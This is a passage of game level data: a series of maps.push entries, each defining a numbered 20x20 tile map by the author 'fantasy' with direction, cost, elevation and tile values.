0,21,19,19,18,18,17,16,0,0,0,0,16,17,17,18,18,18,19,19,20,20,20,20,19,18,17,17,0,0,0,0,16,17,17,17,17,18,18,18,19,19,19,19,19,18,17,17,16,16,0,0,0,16,17,17,17,17,18,18,18,18,18,18,18,18,17,17,15,16,16,0,0,0,16,16,17,17,17,17,18,18,18,18,18,18,17,17,15,15,15,16,0,0,0,0,16,16,16,17,17,17,17,17,17,17,17,16,14,14,15,16,0,0,0,0,0,0,0,16,17,17,17,17,17,17,17,0,100,14,15,16,16,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="9",author="fantasy",id="#1659990670",direction="right",cost=246,elevation=0,map=[7,2,2,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,7,7,0,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,8,94,7,7,7,7,0,0,0,0,0,7,7,7,93,7,7,0,0,0,8,8,8,8,7,7,7,0,0,0,0,7,7,9,9,7,7,0,0,0,9,9,9,8,8,7,7,0,0,0,7,7,7,10,9,9,7,7,0,0,9,9,9,9,8,8,7,7,0,0,7,9,10,11,11,10,9,7,0,0,9,10,10,11,9,8,7,7,0,0,7,9,11,15,15,13,9,7,0,0,9,10,11,11,9,8,7,7,0,7,7,13,17,16,16,17,10,7,0,0,10,10,11,11,11,8,7,7,7,7,9,17,17,14,12,17,17,7,0,0,12,12,12,11,11,8,8,7,7,9,9,17,14,8,8,8,13,7,0,0,12,12,11,11,12,12,11,11,11,13,16,14,8,7,7,8,12,7,0,0,12,12,11,11,13,13,14,15,15,17,14,8,7,7,7,7,8,7,7,0,13,14,13,13,15,15,15,17,16,14,12,8,7,0,0,7,7,8,7,2,14,15,15,15,15,17,17,17,14,8,8,7,0,0,0,0,7,7,7,2,14,15,16,16,16,17,16,14,12,8,7,7,0,0,0,0,0,0,0,0,100,15,16,17,17,17,16,14,12,8,7,0,0,0,0,0,0,0,0,0]});
maps.push({name="10",author="fantasy",id="#1659990694",direction="left",cost=280,elevation=16,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,19,19,19,19,17,16,16,8,0,0,0,0,0,0,0,0,0,6,6,6,19,19,19,19,17,16,94,8,8,0,0,0,0,6,6,6,6,6,6,6,20,20,20,19,17,16,16,16,8,0,0,0,6,6,7,7,7,6,6,0,2,22,21,19,17,16,14,16,8,0,0,0,6,7,8,7,6,0,0,0,2,22,21,19,17,17,14,14,7,0,0,6,6,7,8,8,6,0,0,0,22,22,21,19,19,17,17,14,7,7,0,6,7,8,8,8,6,0,0,6,21,21,20,20,19,16,16,14,12,7,0,6,7,8,8,6,6,0,6,6,20,20,20,20,18,18,16,13,11,7,0,6,7,9,7,6,0,0,0,0,20,20,20,19,18,18,16,13,11,7,7,6,7,9,7,6,0,0,7,7,20,20,20,18,18,15,15,13,12,11,7,7,9,9,7,6,0,0,0,7,19,19,20,18,17,15,15,13,12,10,10,10,10,9,9,6,0,0,0,0,19,19,19,17,15,15,14,13,12,12,11,10,10,9,6,6,0,0,8,8,17,17,19,93,15,14,14,13,12,12,11,10,10,9,6,0,0,0,0,0,17,17,17,15,15,14,13,13,12,94,11,10,9,9,6,0,0,0,9,0,15,15,15,14,14,14,13,12,11,11,10,10,9,9,6,0,0,0,0,0,15,15,15,14,12,11,11,11,11,10,11,11,11,9,6,0,0,0,0,10,15,15,11,11,11,11,11,11,11,11,11,11,9,9,0,0,0,0,10,100]});
maps.push({name="12",author="fantasy",id="#1659990739",direction="forward",cost=87,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,16,127,127,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,16,127,127,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="13",author="fantasy",id="#1659990768",direction="forward",cost=243,elevation=0,map=[0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,2,2,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,0,1,1,53,53,53,53,53,53,53,53,53,53,53,53,0,0,0,0,0,0,1,53,53,53,53,53,53,24,13,13,24,53,53,53,0,0,0,0,0,0,1,53,53,53,53,53,53,13,66,66,13,53,53,53,0,0,0,0,0,0,1,53,53,53,53,53,53,13,66,66,13,53,53,53,0,0,0,0,0,0,1,53,53,53,53,24,13,24,66,66,24,53,53,53,0,0,0,0,0,0,1,53,53,53,53,13,13,66,66,66,13,53,53,53,0,0,0,0,0,0,1,53,53,53,53,13,13,66,66,66,13,53,53,53,0,0,0,0,0,0,1,1,53,53,53,24,66,66,66,24,13,53,53,53,0,0,0,0,0,0,0,1,1,1,1,1,1,66,24,13,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,53,53,53,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,1,1,53,53,53,53,53,53,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,2,2]});
maps.push({name="14",author="fantasy",id="#1659990785",direction="forward",cost=271,elevation=0,map=[0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,118,118,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,118,118,118,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,118,118,118,118,118,118,118,1,1,0,0,0,0,0,0,0,0,0,1,1,118,118,118,118,118,118,118,118,1,1,0,0,0,0,0,0,0,0,1,118,118,118,118,90,118,94,118,118,118,1,0,0,0,0,0,0,0,0,1,118,118,118,118,118,118,118,118,118,118,1,0,0,0,0,0,0,0,0,1,118,118,90,118,118,118,118,118,118,118,1,0,0,0,0,0,0,0,0,1,118,118,118,118,118,118,90,118,118,118,1,0,0,0,1,1,0,0,0,1,118,118,118,118,118,118,118,118,118,118,1,0,0,1,1,1,1,0,0,1,118,118,118,118,118,118,118,118,118,118,1,0,0,1,18,18,1,1,0,1,118,118,118,118,118,118,118,118,118,118,1,1,1,1,66,66,18,1,0,1,93,118,1,1,1,1,118,118,118,118,118,1,1,18,66,66,100,1,0,1,1,1,1,0,0,1,118,118,118,118,118,24,18,66,66,66,18,1,0,0,0,0,0,0,0,1,118,118,118,118,118,118,18,66,66,66,18,1,0,0,0,0,0,0,0,1,118,118,90,118,118,118,18,66,66,66,18,1,0,0,0,0,0,0,0,1,118,118,118,118,118,24,18,66,66,66,18,1,0,0,0,0,0,0,0,1,1,118,118,1,1,1,18,66,66,18,1,1,0,0,0,0,0,0,0,0,1,118,118,1,0,1,1,18,18,1,1,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,1,1,1,1,0,0]});
maps.push({name="15",author="fantasy",id="#1659990804",direction="forward",cost=165,elevation=-12,map=[0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,2,2,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,57,57,57,90,1,0,0,0,0,0,0,0,0,0,0,0,1,57,90,57,57,57,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,57,57,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,57,57,90,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,90,57,57,57,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,57,57,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,90,57,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,57,57,57,90,57,1,0,0,0,0,0,0,0,0,0,0,0,1,57,57,90,57,57,57,57,1,0,0,0,0,0,0,0,0,0,0,0,1,131,57,57,57,57,57,131,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,132,132,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,90,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,2,2,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="16",author="fantasy",id="#1659990824",direction="forward",cost=104,elevation=1,map=[0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,6,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,6,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0]});
maps.push({name="19",author="fantasy",id="#1659990890",direction="right",cost=195,elevation=0,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,46,46,46,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,46,46,46,2,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,46,46,2,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,46,46,1,0,0,0,0,0,46,46,46,46,46,46,46,46,46,46,46,46,46,46,1,0,0,0,0,0,100,46,46,46,46,46,46,46,46,46,46,46,46,46,1,0,0,0,0,0]});
maps.push({name="20",author="fantasy",id="#1659990914",direction="right",cost=404,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,100,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,24,100,24,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,24,24,24,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,100,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,100]});
maps.push({name="21",author="fantasy",id="#1659990935",direction="left",cost=38,elevation=0,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,2,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,2,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="23",author="fantasy",id="#1659990978",direction="forward",cost=303,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,32,32,32,32,0,0,0,0,0,0,0,0,0,0,32,32,33,33,33,33,33,33,33,32,32,24,24,0,0,0,0,0,0,32,32,33,33,33,33,33,33,33,33,33,32,24,24,24,24,0,0,0,32,32,33,33,33,33,33,33,33,33,33,33,32,24,24,24,24,0,0,0,32,33,33,33,33,33,33,33,33,33,33,33,32,24,24,24,24,24,0,0,32,33,33,33,33,33,33,33,33,33,32,32,32,24,24,24,24,24,0,32,32,33,33,33,33,33,33,32,32,32,32,24,24,24,24,24,24,24,0,32,33,33,33,33,33,33,32,32,24,24,24,24,24,24,24,24,24,24,0,32,33,33,33,33,33,33,32,24,24,24,24,24,24,24,24,24,24,24,0,32,33,33,33,33,33,33,32,24,24,24,24,24,24,24,24,24,24,24,0,32,33,33,33,33,33,33,32,32,24,24,24,24,24,24,24,24,24,24,0,32,32,33,33,33,33,33,33,32,32,24,24,24,24,24,24,24,24,24,0,0,32,33,33,33,33,33,33,33,32,32,32,24,24,24,24,24,24,24,0,0,32,33,33,33,33,33,33,33,33,33,32,32,32,24,24,24,24,24,0,0,32,32,33,33,33,33,33,33,33,33,33,33,32,24,24,24,24,0,0,0,0,32,33,33,33,33,33,33,33,33,33,33,32,24,24,24,24,0,0,0,0,0,32,32,33,33,33,33,33,33,33,33,32,24,24,24,0,0,0,0,0,0,0,32,32,32,32,32,32,32,32,32,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="24",author="fantasy",id="#1659991005",direction="right",cost=111,elevation=0,map=[109,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,109,109,109,0,0,0,0,0,0,0,109,109,109,109,0,0,0,0,0,0,109,109,109,109,0,0,109,109,109,109,109,109,109,109,109,0,0,0,0,0,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,0,0,0,0,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,0,0,0,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,2,0,0,109,109,109,109,109,0,0,0,0,0,0,0,109,109,109,109,109,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="25",author="fantasy",id="#1659991028",direction="forward",cost=94,elevation=-17,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="26",author="fantasy",id="#1659991048",direction="forward",cost=160,elevation=-8,map=[0,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,13,13,13,13,13,13,1,1,1,1,1,1,1,1,0,0,0,0,1,13,13,13,13,13,13,13,12,11,11,11,10,9,9,1,0,0,0,0,1,13,13,13,13,13,13,13,12,11,10,10,10,8,9,1,0,0,0,0,1,1,1,1,1,1,1,1,12,11,10,9,8,8,9,1,0,0,0,0,0,0,0,0,0,0,0,1,11,11,10,9,8,8,9,1,0,0,0,0,0,0,0,0,0,0,1,1,11,10,10,9,7,8,9,1,0,0,0,0,0,0,0,0,0,0,1,11,11,10,9,9,7,8,8,1,0,0,0,0,0,0,0,0,0,0,1,10,10,10,9,7,7,7,1,1,0,0,0,0,0,0,0,0,0,0,1,10,9,9,9,7,7,7,1,0,0,0,0,0,0,0,0,0,0,0,1,10,9,8,8,8,7,6,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0]});
maps.push({name="28",author="fantasy",id="#1659991095",direction="forward",cost=181,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,6,6,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,6,6,7,6,6,5,0,0,0,0,0,0,0,0,0,0,0,5,5,6,6,7,7,7,6,6,5,0,0,0,0,0,0,0,0,0,0,5,6,6,7,8,8,7,7,6,5,0,0,0,0,0,0,0,0,0,0,5,6,7,7,8,8,8,8,7,5,0,0,0,0,0,0,0,0,0,5,6,6,7,9,9,9,10,8,7,5,0,0,0,0,0,0,0,0,0,5,6,8,8,10,10,10,10,8,8,8,5,0,0,0,0,0,0,0,0,5,6,8,10,12,11,11,11,11,9,8,5,0,0,0,0,0,0,0,0,5,8,8,9,12,14,13,10,11,9,7,5,0,0,0,0,0,0,0,0,5,7,8,9,12,15,16,14,10,10,7,5,0,0,0,0,0,0,0,0,5,7,7,9,11,11,13,13,12,10,7,5,0,0,0,0,0,0,0,0,5,6,7,9,9,11,13,12,11,8,6,5,0,0,0,0,0,0,0,0,5,5,6,7,9,9,10,8,8,6,6,5,0,0,0,0,0,0,0,0,0,5,5,6,7,9,9,8,7,6,5,5,0,0,0,0,0,0,0,0,0,0,5,5,6,6,8,8,7,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,6,6,6,6,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="30",author="fantasy",id="#1659991139",direction="forward",cost=202,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,6,6,6,6,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,6,6,6,6,6,6,5,5,5,0,0,0,0,0,0,0,0,0,5,5,6,6,7,7,6,6,6,5,5,5,0,0,0,0,0,0,0,0,5,5,6,7,7,7,6,6,6,5,5,5,0,0,0,0,0,0,0,0,5,5,6,7,7,8,7,6,6,6,5,5,0,0,0,0,0,0,0,0,5,5,6,7,7,8,7,7,6,6,6,5,5,0,0,0,0,0,0,0,5,5,6,6,7,8,8,7,6,6,6,6,5,0,0,0,0,0,0,0,5,5,6,6,7,7,8,7,6,6,6,6,5,0,0,0,0,0,0,0,5,5,5,6,6,7,8,8,7,7,6,6,5,0,0,0,0,0,0,0,5,5,5,6,6,7,7,8,7,7,6,6,5,0,0,0,0,0,0,0,5,5,5,6,6,6,6,7,7,7,6,6,5,0,0,0,0,0,0,0,5,5,5,5,6,6,6,6,6,6,6,5,5,0,0,0,0,0,0,0,0,5,5,5,5,6,6,6,6,6,6,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0]});
maps.push({name="32",author="fantasy",id="#1659991185",direction="right",cost=346,elevation=0,map=[0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,112,112,112,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,112,112,113,113,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,112,112,113,113,114,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,112,113,113,114,114,77,24,24,24,1,1,0,0,0,0,0,0,0,0,1,112,112,113,113,114,115,77,24,24,24,77,1,1,1,1,1,1,0,0,0,1,112,113,113,114,115,77,77,24,24,77,115,114,113,113,112,2,0,0,0,1,112,113,114,114,115,117,77,24,77,120,115,114,113,113,112,2,0,0,0,1,76,76,76,115,116,117,77,24,77,117,115,114,113,112,112,1,0,0,0,1,112,113,76,114,116,118,118,76,120,117,115,115,90,112,1,0,0,0,0,1,112,113,76,114,116,117,118,76,120,116,115,115,113,112,1,0,0,0,1,112,112,113,113,114,116,117,119,119,76,76,76,76,76,112,1,0,0,0,1,112,113,113,114,114,116,76,118,117,117,116,114,114,113,112,1,0,0,1,112,112,113,90,114,115,116,76,116,116,116,116,114,114,113,112,1,0,0,1,112,112,113,113,114,114,114,76,116,115,115,114,114,113,113,100,1,0,0,0,1,112,113,113,76,76,76,76,114,114,114,114,113,113,112,1,0,0,0,0,1,112,112,113,113,113,76,114,114,114,90,113,113,112,112,1,0,0,0,0,0,1,100,112,112,113,76,113,113,113,113,113,112,112,1,0,0,0,0,0,0,0,1,1,112,112,112,112,112,112,112,112,112,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
